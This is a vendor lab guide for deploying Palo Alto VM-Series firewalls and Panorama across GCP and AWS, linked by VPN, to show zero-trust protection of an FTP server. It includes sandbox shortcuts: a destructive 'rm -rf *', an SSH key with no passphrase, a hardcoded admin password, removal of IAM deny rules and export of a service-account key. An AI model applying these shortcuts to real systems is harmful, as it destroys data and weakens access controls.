![](https://lh4.googleusercontent.com/t7jkQYFhuAJMY_N7EIF-KjQJbAiQnAYn5YyKhkUk5NAh3ok180k7sjjwWtQAD_9z2t7VqqWUg4V9C9caRERs6ddpURc9SJXDaT4R-wPZbKsa76QrWe-17gtRaTg8ufJHOcwqGV8AKCr6C13m48GEjas)

# Zero Trust Multi-Cloud QwikLab Guide

<br/>

## Consistent Security Delivered for Cloud Workloads on AWS and GCP

<br/>

# Overview

The goal of this workshop is to take you through a simple multi-cloud deployment scenario where the Palo Alto Networks VM-Series firewall secures the workloads deployed on both AWS and GCP cloud environments. This workshop will demonstrate a use case that involves deploying Zero Trust Policies on VM-Series Virtual Next-Generation Firewall (NGFW) to protect your applications against various attacks.

While this exercise is focussed on two Public Cloud environments, the Palo Alto Networks Network Security Platform ensures that the same consistent security posture can be deployed on Hybrid Cloud/Hybrid Multi-Cloud environments as well. For the purpose of this exercise, we will be simulating a scenario where the GCP environment will be considered as the On-Prem Private Cloud Data Center, while the AWS environment will be considered as the Public Cloud Landing Zone where our FTP server is running. The On-Prem FTP clients periodically upload data to the FTP server in the form of backups, snapshots, etc. Meanwhile, a malicious FTP client can be sneaked into the On-Prem environment to exploit any vulnerabilities that the FTP Server may have. We will see how, by deploying the Palo Alto Networks Network Security Platform across both environments, such attacks can be blocked with ease.

<br/>

## Hands-On Lab – Zero Trust Exercise Summary

As part of this workshop, you will be deploying security services on Palo Alto VM-Series Virtual Firewalls to protect your multi-cloud environment against a FTP Vulnerability.  You will follow best practice recommendations to deploy a tiered protection with the VM-Series NGFW.

A Zero Trust implementation should provide security administrators with the visibility and the ability to secure traffic between the various applications. 

<br/>

## Hands-On Lab – Palo Alto Networks Product Coverage

- **[VM-Series Virtual Next-Generation Firewalls](https://www.paloaltonetworks.com/prisma/vm-series)**

  - Protect Private Cloud investments
  - Safeguard cloud and virtualized investments with the virtual firewall that pays for itself. VM-Series NGFWs are built for high performance and significant ROI.
  - Detect hard-to-find threats, Stop outbound traffic exfiltration, Protect against lateral movement

- **[Panorama™](https://www.paloaltonetworks.com/network-security/panorama)**

  - Consolidate policy management. Panorama™ network security management simplifies policies across infrastructures and clouds. Seamless integration. Increased oversight.
  - Panorama can be deployed as a virtual appliance on VMware ESXi™ and vCloud<sup>®</sup> Air, Linux KVM, and Microsoft Hyper-V<sup>®</sup>.

<br/>

# Lab Environment Overview

![](https://lh4.googleusercontent.com/4MT3KEJ4sHaj0HbgZMm67S_HgW6v9-ZGFTile5ASfq_8fyeAx2k7QmHaP_Ax95w_eStQ4P5v8sZdgFywg24ZUQvs8PGWQOTJ7_GpPwvGRdvCPX4M_EAW214gbxL-nax79MCXpwOmo6OxIq-Gx_ycAeI)

**Figure:** Hands on Lab Environment – Achieving Zero Trust Security

<br/>

## What You'll Do

- Deploy the recommended reference architecture for VM-Series NGFWs on Google Cloud with workloads that will be the FTP clients.
- Deploy the recommended reference architecture for VM-Series NGFWs on AWS with a workload that will be the FTP server.
- Connect the AWS and GCP environments through VPN.
- Configure VM Monitoring and DAGs on Panorama to automate security policy application for any new workloads.
- Run the Eicar and FTP Exploit attacks.
- Use Panorama to Monitor Logs to see Security activity

<br/><br/>

# Activity 1: Deploy the Lab Environment

In this section, we will deploy the cloud resources on both AWS and GCP, including the VM-Series NGFWs and Panorama. The Panorama here will be deployed on GCP and will manage the VM-Series NGFWs on both AWS and GCP. We will also be configuring the VPN gateways that will connect both the cloud environments.

1. Login to Qwiklabs portal(<https://paloaltonetworks.qwiklabs.com/>) and click on “Multi Cloud Hands-on Lab” as shown below.

![](https://lh5.googleusercontent.com/BX-o8K-X6h0QBIRXFXKITj_GRg4yWgg7fiWvfGDMtXm2QUOw2zlB72ZwuhMfh03S2dTQgF5qdlwgeQ_w-Vj5aAcH0uttFDMkzw1-grbUbwoeRFn4mr29Y-YsoJaESORx8HF5Jof-JluAQvsrjnXlWFs)

<br/>

## Deploy the Google Cloud resources

2. Click on “\[MULTI CLOUD LAB – GCP] Deploy the Google Cloud Resources” as shown below.

![](https://lh5.googleusercontent.com/kVLUVOkRniQijL0oxJ2HnZ5TopYIP--kofiAH5HGQbBZYGG2aMnnqT81zQGXe8Z_079yliBNVcbgZ-F2VZd2396b7kgwhPlqEYKDcdOunBB7EqwsBCAVf4Ee19S96g_rUdXW6tr12dv3OYfjbNcbiTQ)

This will take you to the below mentioned screen where you need to click on “Start Lab”

![](https://lh3.googleusercontent.com/ZVJz2R1LTlRYk2iOPOzDZNiZ_vgmGX29FO4ae0S8dDTLBePWRrx7_i7ZkfwtSltTUaW_hmmOIYYn8O9R8yqnt2VdTHjc01WghD4TwFx5VyeoD3hLtZncbW57skD3_qKIA4gPJMz1uVOMSFtDRpYiKhM)

<br/>

### Access the Google Cloud Console

After the lab resources are provisioned, you can access your lab environment's Google Cloud console.

**Note:** Open the Google Cloud console in an Incognito/Private browser tab or window. The outputs generated in the Qwiklabs portal are used throughout the lab.

3. In the Qwiklabs portal, right-click the “Open Google Console” button and open the link in an Incognito/Private Window. Click on Next to enter password
4. Copy password from the lab as shown below and paste in the google cloud login page as shown below.

![](https://lh5.googleusercontent.com/QIA09NapXGyN3mZqcmyew81ptuS3wdfppV-2_yOgOwAsyJNfspclou22hMbhTzK8C_PplkxEXpaMD0tGm2bkSY8Ng2PQ263RHfJxNxsQ4VIvPdth3OB9-y2Wv29ougWynHXebVrz9zPRZjXhElHpUSQ)![](https://lh4.googleusercontent.com/lOsgkbSzHkl6vj3Yg4ZWK0F-aYQrcQwp7hLg354JIoAmRRTqppTG2a36eOc8eX0bElXft2HuBwEWYu2cBryO3OcrswAealjiiHVCslZI0-jHnqSlwU_5QEA2oCRt47FMYK9EP32G1ko0h3r8fhIy7WI)

5. Clicking on Next in the above screen will take you to the screen as shown below, where you need to click on “I understand”.

![](https://lh6.googleusercontent.com/d9A-KdSWWkP4JzDsChO8Z5lE5Shegxf2Gjq306ABi5r_fUNd6T4HGlZVffLyZqzFinMWP_vlfYPbfwz_TSU_82atx3TvCDDHL5jdxleoedweV9j4Ue7BK1KDKZmQeKPIFIWCBXABRxo_sb4fU3uXq20)

6. Click on the checkbox to agree to the “Terms and Conditions” and then click on “AGREE AND CONTINUE” to continue into google cloud console.
7. If you are presented with the below screen on google chrome, click on “No Thanks”

![](https://lh5.googleusercontent.com/mQ3NpNM466yahlVVLf9Yi0cy-oWEUseigps1AfeCVbjwpCO5t94b5yTyfsO4V0piAYi8voixuNRPdZYIeMbmA6LYHFthq1ZyJ3f2eVS8ooqVeB9-wuqQC0gsXwSvsXwpyd9XIdN_I4FFsuUo77iZixI)

8. Google Cloud Console will be landing on dashboard page as shown below

![](https://lh6.googleusercontent.com/oWOE9FmfWcpcX03LaOdlvKe7wha2d5-9u1fhtDhsHGewLDodcVyylzfpOvyqaBWvCAh7v-zHGxfEsfr-tTpGBZ_ccmdvN_JIYCpJadqwSTQTjhB6BTeN-3xDMH3b2Jq4AL2hiusxf8Fv51_6ZSykuwA)

<br/>

### Deploy the GCP resources using Terraform

9. In the Google Console, open Cloud Shell by clicking on the icon on the top of the page as shown in the image below.

![](https://lh4.googleusercontent.com/PaqG9aNaz_Rs3f99PJdud2ICmFesXrDWjpgnTcStuYQfh_2NaAJySpqqEwwu0oVAgdOxqeE_Sc6Xmv7JdTywTK1WABeS_D3D0lIZB239jia4Xku9MjtLiA7BgSPIOWMB3T3LJLIQkKi8atIPd1AWmo4)

Click continue to open the Cloud Shell

![](https://lh6.googleusercontent.com/2GgeGqJ0I4K3zVS6sY7inj4vnZcZJWY3Dh1lwc9Sh_4lRV0MwdauphUoXdYnPQoyVeyopgVxM3tRXyKN5rfQwUkp6HRvZYkl0Qf8uAoKgqzn7v6G5VKug0pYvTTZps9_hjX8Yg-E5ggKpPNGBHKi9pU)

Cloud Shell will be opened as shown below.

![](https://lh5.googleusercontent.com/Oc7J2WKCeUY58eZBSrNEd0Yj-qi187RdAV-AgCcPPyW6ONnCUunLVlXJSYgi55hT9a7O2dOEFTFH582AzB66ADD3O_GZjVdvddkliTwYNmKyIcv-exhRX1H7dByQU9b6cGmprvdZ5lbks3EGZEsbjI0)

10. Clone Palo Alto Git repository to build the lab on GCP. Execute below mentioned commands to build the setup on GCP.

```
rm -rf *
ssh-keygen -f ~/.ssh/gcp-demo -t rsa
```

**Note:** Hit enter when prompted for Passphrase, no need to enter any value.

![](https://lh4.googleusercontent.com/cofMq62a1koMT3Rw4Mh37ulzUL82hq-oXEh9xUUAORrN2ByAO9OpkpOCtK8Y3AXr87pDFUlEh5dClLAY_RcA3RQELCUPfloEp_I7NMhbXJV06-oWdmYWK849Z77H2K0LpHfG1i2b40rKwQmo5JX8l4w)

```
git clone https://github.com/PaloAltoNetworks/panw-multi-cloud-lab.git && cd panw-multi-cloud-lab/labs/multi-cloud
```

![](https://lh4.googleusercontent.com/syri1he1LBWCQf89go_k0ERNrxQ-uBzDZceRdq4v4jSetfUIq9uy5YKUK79JfgmE9E54OQBnrUa5gW3LIBMayL2pamFBoymYqkNrMmSwmh1m_a1kqyYaui2YZKtepUDNNsgx8jATaKzuwFeYkI2IT5k)

```
./step-1-setup-gcp.sh
```

The setup should take around 5 minutes to complete. With this, we will be automatically deploying the Palo Alto Networks recommended Hub-Spoke architecture with Autoscaling, along with the Panorama and a Spoke VM Instance that will be our FTP Client.

![](https://lh4.googleusercontent.com/uMpNPJ-xHHEHdDhRsYBY5HLBXOKlwAa7MXBwCA6MBLFOzz1qAWNJQZ2dEtmR530QrBWfPeUNzKllpaEpRGn0v7s2GfLLQ8SCGVrLJCn-PcRB9ltF_rcW5x_TNYBvUA4zaL30g0edNpzcAEJYYAW9p7M)

Output of this setup will be Panorama Public IP and VPN Public IP address.

_Please make a note of Panorama and VPN Static IP on a notepad. We will need those later in the lab._ 

<br/>

### Configure Panorama for Logging

11. Copy the value of PANORAMA_IP from the output of the setup that you just completed.

12. Run the below command in GCP CloudShell to login to Panorama via CLI using the value copied in the previous step.

```
ssh -i ~/.ssh/gcp-demo admin@<PANORAMA_IP>
```

![](https://lh6.googleusercontent.com/xnAw6DYYuVqmJ6SqEhXlddvzOJeA1Wset4xv-Ap8nQGdqyumNpFc5C_KBV5hWVOlLW6ZMpOBvkKGcOhHuibiVVRMhguamodAUZ8sjSTEBeQ1dVruKjtd5dSD0sQK7mr3uQxvnLTPTiYinzwqyJ5aODo)

The password here is **Paloalto@1**. If the login fails initially, it is just because the Panorama is not ready yet. It can take around 2 mins to set up. Please wait and try again.

13. Once logged in, run the following commands on the Panorama prompt.

```
configure
```

14. Replace <PANORAMA_IP> with the public IP address of the Panorama.

```
set deviceconfig system public-ip-address <PANORAMA_IP>
```

15. Commit the changes.

```
commit
```

16. Add the extra disk to Panorama for logging. Enter ‘y’ when prompted.

```
request system disk add sdb
```

![](https://lh4.googleusercontent.com/s6H0sq1DF7CfzMcyxAzAsfqSlcCJoWnaUSJSQtV2PoAnQwdlYZcUKiXdserQlKflRtCWicXyDcRVRyA-oTHZQZzBU3tTCV-baK9mtWyY2ACcj3M_m0GYSeCh2ngxj9USuUZkx14qKIY9y-LSe9xfYao)

17. Restart the Panorama for the disk changes to take effect.

```
request restart system
```

![](https://lh5.googleusercontent.com/uYN-hGim4RHbDwQfW-RDh-dy3nwCJXqN5qjDSlGGow9riJdfSAy4fBFnCD-FelDgxJ6ykxnf_F58nNyueOolFB25MTTiiANzMKdl8qaljHzvhnc3n6fuqnTBX6PGq6PbngiMD1UPAr45VmudMmAFffs)

18. The Panorama now will be rebooted with the Logging enabled.

<br/>

## Deploy the AWS resources

<br/>

### Access the AWS Management Console

19. Click on “\[MULTI CLOUD LAB – AWS] Deploy the AWS Cloud Resources”  or open in new tab as shown below

![](https://lh5.googleusercontent.com/r6lQ3S41BgkoJ7U_porjQZ2F6YRNJbJt4Y-FpWF2mTriwhQrntZsccsOWYCJIAtI3N52nubhIghxT4xDyy0mWWt_iv1oxFmW0AcGISL8aFGPPdFLgjpluyunMSyg3RRx4Y1IEJUrPzsLYHXeAkh-FKA)

20. Now click on “Start Lab” as shown below to start AWS lab.

![](https://lh5.googleusercontent.com/l5RPPSeaRor_SAR3y20WI1O26HN2Gav-rcaJo-kpRNPbvWZrKy_izjk6QcmBXgl8x2rRVfqVrWvK_1fi2PG34326vRMn2ZTm55zu6U_G909yznEmPEEpOjoUkbnzzm82rx6n-C-m3awUkWp-rWlz5yU) 

At this point, Qwiklabs will build an AWS account for you. In order to access the EC2 application instances via SSH in your environment, you will be using keys generated by Qwiklabs. There are two types of keys generated; PEM and PPK keys.

21. If you are on a Mac system, you will be using ‘Terminal’ to connect to the devices via SSH. For this, click on the “Download PEM” link. This will download a file named “qwikLABS-L\*\*\*\*\*-\*\*\*\*\*.pem”. 
22. If you are using a Windows laptop to access this lab, you will need to have a SSH application like PuTTY installed. In this case, click on the “Download PPK” link. This will download a file named “qwikLABS-L\*\*\*\*\*-\*\*\*\*\*.ppk”.
23. Make sure to note the location where the file is downloaded. On a Mac, by default, it should be downloaded to “/Users/&lt;username>/Downloads”.

![](https://lh6.googleusercontent.com/j0QhZFKbsS4Wm4Sjj54GlerRIbXCJTSeVjc03A-Dyq3ZdaVKRIP1f9rpVMuUp_d-CMceapjAx7XGusl6gH6Ni5_qRWeZ_snsKWSqc2DNXWMwyPuhtzwQKiYZHttrp5s4yGK3S_i7meWSMdQ3HHSemaQ)

24. To login to the AWS environment, right click on “Open Console’ and “Open link in Incognito window” for Chrome-based browsers. For other browsers, use the appropriate option to open the AWS Console in a new private tab.
25. On the AWS Console, copy over the IAM username and password from the previous tab.

![](https://lh6.googleusercontent.com/DJccFZU-uIqKk6qCYXHBZIUiI9sec2HPjunfrZcBBm-NPtyUsEwcG4hNHrVWZ5IZGyC670loHCOskAYGQVAFWuUGB94ds_UkESjes7xjcB-_FiM5QvqAt6eaKHCvwxG2wFx33FKzdSERwV0ZUkAW6Do)

26. Now, click on “Sign In”.

![](https://lh4.googleusercontent.com/lsd45_oc4Z_-oDex_uNIDAPUh0tDroxL-PgU1G3lHY9n_UxHpkI94yYXddHWYkNtG-6iz2kjqlihiMhAAin_lichrBQopUszutC9_xWcQhSG4H041xgPcRKAXh0cPk5YF68Lmw5XHEjq8ZKXPG7zGTg)

Once you are successfully logged in, you will land on the AWS Management Console.

![](https://lh3.googleusercontent.com/AxnDbNjq4i5kzcomTapo3fOIUXhUoi9bomkh4GEX7v7OiUPc0Hs0gdl2SoJvRsPYqz-6ziNESpngu6QH4O47bukqcGhU1HpLlcoZdxHOWCmHjoCwWDceX4_sPr5yZ6qrsggFHeZLzp3imwpmp6argtg)

<br/>

### Set up AWS Account permissions

As mentioned earlier, the Qwiklab user account, by default, does not have the permissions to AWS Marketplace and CloudShell services, which are required for the purpose of this lab. We will now edit the permissions for the Qwiklab user account to provide access to those services. 

27. On the AWS console, If you see a message for ‘new AWS console’, click on ‘switch now’
28. On the search bar type ‘iam’.
29. Click on the link to IAM. A new IAM dashboard window will open.

![](https://lh4.googleusercontent.com/1crmOMxaIkeXb3MOwxwhJ9bhh78fkwY7K1Yn7nD1hN743LD_smhimx-QZkqs82pQF_cEt992A2VppamMkTST74jSavzC_-9T-oKm3agzP24LlNemUU0W03pXArCsr0Y-2IA2WtcgfmS0mHE_vV7JO8k)

30. Click on ‘2’ below users.

![](https://lh6.googleusercontent.com/YK3TdmbVHDKOqTAVs__CZTPnhll4ZrRIPSsVuwqfHsL8_zOrJQj2oFSPYkp73lHyWjtzYn4ZoIHHUXgS7DECXHIHz_g-x0XwYspJV3HGAX_Zqm4LAN-cgnAi-SSeDbcyJyRGJYKoBcH5gaZSlCmwhO4)

31. Click on ‘awsstudent’

![](https://lh3.googleusercontent.com/kocT6sTzFHg4lFa74DOzUKMPBKTZFur08SMjGjwRAUqXVcicCLy4xqkqfocBNwX1UaAfG8XrncQ7kgITcyCmuBHQzdCJRAz8Q5GfAaMzyNGS_W9BENNevvuRYwGJEv5FYus606t7iHQts6zyvlaB2Qw)

32. Click on default policy to open the IAM policy settings in a new tab.

![](https://lh5.googleusercontent.com/RQ4-vI3m-WVROSQo-20wcg2lOs5akC-SKoJAa4bHSWOhecx5ULfpU0MV7kxcaolAybgB8nWr_w7MOS1PNNyreh-CxJTlgN0NWRnchlYymk3kMHOmVvT4hYUKeFXEyUGU410J-hK3jCXlS9NpwdHWUwg)

33. Click on ‘JSON’ tab

![](https://lh5.googleusercontent.com/p9wut-DBJJ-srICK43Sxd8TASBCbUuZp11pbfByGYl7Ol9JgCykFD541dnGmsGhnQAyMryRddoXp8XAuhRPEHTowb2u7bwarIEsYtry1PSDZDMkTHB_Eql1_4jilaGVxvFEwPwKm5OrFvsr3QiA8Arg)

![](https://lh4.googleusercontent.com/rnGPnSOtey4gBxyABzpPRUPlAYHW7_cJNGANx6-5BmP681fQhaxxZ1C-pjuazaxvecmVAaGq41sK0KQrMiUUHOA0CzNZeyPbAf1xmctuaftcacWsqo9QTrOb4K53zeJ4R5yaFZPJECm7KBWe6nYXPOI)

34. Scroll down to the Deny policy and remove two lines (line number 36 and line number 27) listed below 

```
"aws-marketplace:\*ubscribe", 
"cloudshell:\*", 
```

Make sure to delete the whole line.

![](https://lh4.googleusercontent.com/HhwKHPTfKYOOwe0-uFrZtx_ibdrOHA3mAjpsyRx-zS064bltjw3VSYHaV43zQcHRHiB9RLihB6gijg3MluWBqlAbid31YRxNb0NfEruOrf_RUjpmeAbXyy7sW2YP3b439S6v07ku3LEVE42ABIyO6nk)

35. Click on ‘Review policy’ at the bottom of the screen

![](https://lh6.googleusercontent.com/xGU9CiE-i_2CbXNyFz3SNN3T7Q4wCOo3awz3CJlTgK92_88B3LpS-N_Awvbl80RxkSuwCb55psiwApq_mSEUVElnmC2SF0De4jC7XARQQuC5SdXOnnNaBmLNxmaZX_4m11w5ks3Oq5S_7NxdkqJ2ht8)

36. On the next screen, click on ‘Save changes’

![](https://lh5.googleusercontent.com/YV054fRkOUVJlN4ZLzJoO_fTWuZkuu5R1uvngxhkkqG0OxTG8hYrDIsI8wGBRft76khNv6zsKYPUgqEysexlpz6QuXCO1xgPUMc1cCyGmHK-FoKFyl2NQMDR3l0e2_lfBUa3o1ETE9vXkFAhFUK30mI)

37. Account setup is now complete.

<br/>

### Launch lab environment

In this section, we will deploy the AWS Cloud resources required for the purpose of this lab using Terraform.

38. Click on ‘AWS’ on the top left hand corner to navigate to the primary console.
39. Make sure that the region is N.Virginia.

![](https://lh4.googleusercontent.com/vKxUdLZ8EdxugHqffpj2HF8tc4WHqzsPtQt0IPYQlmr_AwjiFZ57o1pp22TL_fC0C1Bliye1_LIvzHtFLGBvcNzkiNvIt3OD3dOC6g16fdaZlhbe0ULmy2ZMyaNZz3u6EyaUCIgh8V71jS07_gCTY_A)

40. Subscribe to VM series.

    1. Right-Click on the link below and open the link in an Incognito/Private window. On the page that opens up, click on “Continue to Subscribe” and then click on “Accept Terms”.

<https://aws.amazon.com/marketplace/pp?sku=hd44w1chf26uv4p52cdynb2o>

![](https://lh3.googleusercontent.com/V9VnuuMGzHa2e-N1hxnd8CZHaETvHblnZ42tRneVN5j8JtMAbIPk-c5xS1J6CADRW-a57Ch0475c1s7hAxgTtY-J-gq8DDb8CnSSQLi3XhkapBBwPBxwkPnaWkwBDa6XEBtjX0of-GgvsiS_WGvPQIE)

![](https://lh4.googleusercontent.com/N3z2LyyplfyC0kUTUQ7Lrt_8svqi0FyHjc6FglhPmpee7XfcdblHbXrlWWQnPlumstfcjkt8hJH684JKCB6xoBEU4KxjKWTAAC5jn-dKSyRHjn_ykbZV2XgywHQR0xcHiqoiaM6w8U0eM0ZRGXTaumA)

41. Wait a few minutes until the effective date changes from ‘Pending’ to date.

![](https://lh4.googleusercontent.com/aUzGWqwdtKGt7E77q8ZRiM4DXo846uLp_RIem0T4EnRNEVxULKAve4fsI5obqqoR03d_o-7l4xd0OofSHALADczsIsKZf4fiU3uts-Qu8NY5F2_6Nd1lfQZjBHDxGefsXdXze-kmnkZwD_esE8jlnco)

![](https://lh4.googleusercontent.com/ek7wEmYaYyfdeJTAq3ikd8CKuB4Qe50-J6mvMkN98VGy6y6PZ6niJKY6Zj5QvV5nkEufUEwlPsdrSR4ZQr-0eWSTFhh-AxkxueHLnTu6mUgdavFWmKLyHH9iClr_HliCJtR_DnfJgev9FPsG7lSbPvw)

**Note:** If your account is already subscribed to the VM-Series Marketplace service, then you will immediately get this above screen when you click on “Continue to Subscribe”. You can now move on to the next step.

42. From the AWS management Console, launch CloudShell using the icon on the top right side of the console.

![](https://lh3.googleusercontent.com/db1GucN5StkiwEVfV0QcWSgBU8LHcG29sA_ImM5g1IkPN5pX-Dl5MIknC-_DH_ti8_lkJWG-5SLFfw5piH4tMrzrIIvu_-9Kb0tynUImbBrZaSHf19tyyRg47q_tDgHGSqnhT_b-5g95W-U-C7wqZJo)

If you do not see the icon as shown in the image above, please check the region and ensure that you are in the N. Virginia region.

43. Close out the welcome pop up.

![](https://lh4.googleusercontent.com/kO_MS1et4yiZaQ0OJFqTTM_u_Ajz4H2Zr1pvUcxHktJH5kTiKKS-OUipJbpXFH-s5HiCgkI3DnhLfIsuozLVDm_seBfbsSa22V0ZnrPu9KxMz1prEkLDbwxM9ojc6Zgq2KMtJ1dvtx1KnRMtuWsKtE0)

It takes around a minute for cloudshell to launch and to get the prompt as shown in the example below.

44. After the cloudshell is launched, run the following commands. **Make sure to replace _VPN_STATIC_IP_ and _PANORAMA_IP_ with the values noted from the Google Cloud Lab setup output.**

```
rm -rf *

git clone https://github.com/PaloAltoNetworks/panw-multi-cloud-lab.git && cd panw-multi-cloud-lab/labs/multi-cloud

./step-2-setup-aws.sh <VPN_STATIC_IP> <PANORAMA_IP>
```

It will take a few minutes to deploy all the lab components. Status will be updated on the cloudshell console as deployment progresses. At the end of deployment, you should see the message “Completed successfully!”

45. Once the setup is completed, execute below mentioned commands to copy the output of above setup script into a file.

```
cd ~/panw-multi-cloud-lab/labs/multi-cloud/aws/
terraform output -json > ~/outputs.json
```

46. Now download the file by going to Actions on the top-right of the page as shown below.

![](https://lh3.googleusercontent.com/CpMfT-m9TyQJY5_PbglVeUkRf47qCHuLz8vsy-8btnI2lHohj94L74YezI6VUW4Fw0aTJWDuzkLyc2R0LLFgd7-NkbZLdmxlGgwYjVqsHj97lo9LFfPUPYBNlwAYyu9JQwEOce4AIF-nazFxuXEx4KQ)

47. Enter the individual file path as given below.

```
/home/cloudshell-user/outputs.json
```

![](https://lh5.googleusercontent.com/zuGTbzN391pinhLdrbS00rW7S_UBLYVnulvmOWQIUZJSn6DlBfgwfw8iOsKd98ZJ3If5Q64mDtnmfDK4O6DrBr77-0gzsbkbMNM3QKBef1-T6rHV67IeEgqhia6cR4GXuuIgrqKNCkBikVPDZWZRb0I)

This file will have tunnel details which are going to be used to establish a tunnel towards GCP VPN Gateway.

48. Review the deployed lab environment with the topology diagram.
49. On the AWS Console, on the search bar at the top, type VPC and select VPC from the listed results.

![](https://lh5.googleusercontent.com/VeyotUt6KxazF8desiar4HW_--5YxGK0oa3tYv7tNljEMoiOTC1oPkMdp28BApbD_bwUmUC3ieq28enMps0PL4yZsCiju4Ow2G1xYfdp-fsXujqZDb7JdbHt-jsuIbOhP18E83JodkRDtacd0k4nxx0)

50. Review the VPCs that we created.

![](https://lh3.googleusercontent.com/Q2cWADAl0_hOVRhQOjwc1k3YwExsRqSn8W5B9Qs1m-r404SqFvNMV7_5v1X2FlZAfxdMvrZJceWa4KkI4yh_V4rm8Ayc3Yi850Ih7igEdbHlu0fj9aPDc6F90fHr3NSTPdgbW-UBeKx7qPj3nKFhKas)

![](https://lh4.googleusercontent.com/-B5jNxlBopGhZWjOOT1dU3ypi-HtU7m4Id6zZ9IQl3BFMVUNDxGLQ-FcfXy1lwoLtFOpJMqp0Jnb0d0gThd-mmpFjbZdt-K_ZVsEbQH811AnRNb6ZfruxDB9c60wVQOyiERd8PCfpf4jLrn-NnkBIto)

Now we have completed the deployment of most of the resources on AWS and GCP. The only pending piece is that of the VPN Configuration on the GCP side. So we will now switch to the GCP Console to deploy the final piece of the puzzle.

<br/>

## Complete the VPN Configuration on GCP

51. Navigate back to the GCP CloudShell tab on your browser. If the CloudShell session got disconnected, please click on “Reconnect”.
52. Upload the outputs.json file (that was downloaded from the AWS CloudShell environment on Step 40) to the GCP CloudShell home directory.

![](https://lh4.googleusercontent.com/_9aczRG4DRENzU8FmETj2Tf5n7VtoBE4USVd0auXOmRlr0Zcq_iMbw36UsXxidiUqo_1DnexX-NKcIbERW5Y9pG4N1WR25dziWh-jFezwncpNUa6hiE55qEMiAVO0tU1l9TWz4GgVMcVxWZeajV-jWg)

**Note:** While uploading this file, make sure that the file name is **outputs.json**. The setup script will fail if the file name is anything different.

53. Run the following commands to complete the setup.

```
cd ~/panw-multi-cloud-lab/labs/multi-cloud/
./step-3-setup-gcp-vpn.sh
```

54. Search for “VPN” on google console and select “VPN” part of Hybrid Connectivity

![](https://lh4.googleusercontent.com/P6DDN-pIdGJmJ74Dkdqtoy0UVkwyfJYSLYPv-YoIqZJERVU22IHyzTkmtk7HbIHeNqfCTjSMMyDR2dxbEEbqan_jjE3uXTPV9Gmhixj05lX-asOWJH_RgF1CQQ94i9314BsFk0va0gXCHr8WdfA5sMY)

55. Ensure that both Tunnels (vpn-1 and vpn-2) statuses are GREEN and are up and running.

![](https://lh3.googleusercontent.com/E3yu2xiZrSI_Tas4Z4R0thX8fdzHFnzfSUTV0yvWyuqKRX2hsbufaLAnTgOu7UJSzUQu-PvXMPYEqU5qQYU8EKFlNVe24YyoQOzjDCn0FOV2euPvqmz8gZwwLng88EQ8sIToJuZC_cJNuLFFaHHI_1E)

56. On the AWS Console, Navigate to “Site to Site VPN Connections” from the left menu on the VPC Dashboard and click on the single VPN Connection displayed on the page.

![](https://lh5.googleusercontent.com/y5IQvLkOxSNsjk_92Soc-e4sb9eJuSpwTEpQ8lOY8cufYjIqaP0tNKI6GFIQnl5M1wz3rUQm5MqhtQwCbAL4lIZO7EI-rzV6dxhv6uu9pdp7OQ_6M1lF6VP5Qt6ghs_R-tHwsuX6b9eyfzOvwQD3fHE)

57. The status of the VPN tunnels here should be up. This might take a few minutes.

58. Login to GCP Spoke VM by clicking on “SSH” next to the VM instance on the GCP console and ping FTP server on AWS with IP 10.1.1.100 using the following command

```
ping 10.1.1.100
```

![](https://lh4.googleusercontent.com/d_b6WfJokaD98srzlJo58poV4dKu4MD_4q3fuIsrIHL6AxLmYDf4yKANHddLKm8jEz9Su6Ru0kJuoRij1G2E15tWzX2WSXYTfVYmyqnXseqvaRSgZqQiZycT7-XnnT0oOqjJfYedJLf4sHe4qFAmOhY)

**Note:** 10.1.1.100 is the private IP address of the FTP server deployed on AWS. If the ping does not go through, it's probably because the firewalls have not been configured through Panorama yet and all the traffic between the clouds go through the firewalls in the respective clouds. That's ok, we can move on to the next step of configuring the Panorama and revisit this after committing the changes on the Panorama. 

<br/>

## Configure VM Monitoring and DAGs on the GCP Plugin

59. On the Google Cloud Console, navigate to the Service Accounts page by selecting “IAM & Admin > Service Accounts” from the left menu pane.

![](https://lh3.googleusercontent.com/9HUtBaOUJnNJ9-CD8_YGgrV1XigCtwOgjuv-frcAji7TB8rb8mc51ggdDZm99u_dGba_GKx498bkY_0p4NPelfCtPkThVsbsjPQSoBe_u28VV07Kib0LcXTiwbcn4sFg2eR9GptuucCdY2_Ic-z4f-M)

60. Identify the “multicloud-lab-sa” service account and click on it.

![](https://lh4.googleusercontent.com/wvXEM9_oQ5r9WYMdnUiXTLd10WqL1Hcley07GPWenFVS_24vKzukhC-O3Gq4bTFXuvGqFpFATGefe-EQOHNmyUR-KjDu_n5zaNT6UZT6q4ItblEQrbCR_8O2v9gCr3NZT_8zEuuGbzgEmSbUHkW6DKI)

61. On the page that opens up, navigate to the “KEYS” tab and click on “ADD KEY > Create new key”.

![](https://lh3.googleusercontent.com/X5UPwIQOjYydEIveXjPeRaW572I8Pjk7jERyGNmFTerSMpGOZT_R3L_8lWZoEZh0cRqK5YKPu7njriC_bFF95zrMy0Y_VMAXQMX5Cw8TcJkqNTS_2tt1nr31fxCZvB4-jB6sywRFGpg_u5StJcGLjZI)

62. On the popup screen that shows up, ensure that “JSON” is selected and click on “CREATE”.

![](https://lh5.googleusercontent.com/lA2Y2EdwYrT0Ef-_P7mIA8_CyUU5U4ld8iKkU-hANZhp_Jk-Ricxv5YHFb6Mpc_U7sNZ14LYfBxcR05hJ3YkERNISjQI2gwouaMpp-s_4NVJA0E6pz5RQsr_XRiEoY80THvaWi_0BryIwmF2DIeNjuQ)

This will download the credentials for the service account in a JSON file. We will use this JSON file to authenticate our GCP Plugin on Panorama.

63. If you have taken a note of the Google Cloud Lab Setup output as mentioned in Step 12d, copy-paste the value of PANORAMA_URL on the browser tab to open Panorama. 

64. If not, then follow the below steps to get the Panorama URL.

    1. Navigate to CloudShell on the GCP console.
    2. Run the below commands and click on the value of Panorama URL to open the Panorama UI. 

```
cd ~/panw-multi-cloud-lab/labs/multi-cloud/gcp
terraform output PANORAMA_URL
```

65. Login to Panorama using the below credentials

    1. User – admin
    2. Password – Paloalto@1

66. Navigate to the Panorama tab, then to the Google Cloud Plugin from the left menu.

67. Click on “Google Cloud Plugin > Setup > GCP Service Account” and Click on “Add”

    1. In the “Name” field, enter “multicloud-lab-sa”
    2. In the “Credentials” field, click on Browse and select the JSON file for the Service Account Keys that you downloaded in Step 56. Click OK.

